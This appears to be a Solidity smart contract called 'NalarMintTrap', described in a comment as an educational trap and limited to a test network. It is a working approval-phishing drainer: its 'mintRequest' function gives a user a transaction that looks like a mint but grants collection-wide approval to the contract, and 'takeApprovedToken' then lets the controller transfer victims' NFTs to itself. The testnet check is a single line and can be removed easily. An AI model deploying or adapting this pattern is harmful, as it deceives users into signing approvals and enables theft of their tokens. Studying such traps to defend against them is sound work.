// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {ERC165Checker} from "@openzeppelin/contracts/utils/introspection/ERC165Checker.sol";

contract NalarMintTrap {
    IERC721 public immutable collection;
    address public immutable controller;

    error TestnetOnly();
    error InvalidCollection();
    error OnlyController();

    constructor(address collection_) {
        if (block.chainid != 97) revert TestnetOnly();
        if (collection_.code.length == 0 || !ERC165Checker.supportsInterface(collection_, type(IERC721).interfaceId)) {
            revert InvalidCollection();
        }
        collection = IERC721(collection_);
        controller = msg.sender;
    }

    function operator() external view returns (address) {
        return address(this);
    }

    // Educational trap: this request grants collection-wide approval; it does not mint.
    function mintRequest() external view returns (address target, uint256 value, bytes memory data) {
        return (address(collection), 0, abi.encodeCall(IERC721.setApprovalForAll, (address(this), true)));
    }

    function takeApprovedToken(uint256 tokenId) external {
        if (msg.sender != controller) revert OnlyController();
        collection.transferFrom(collection.ownerOf(tokenId), address(this), tokenId);
    }
}
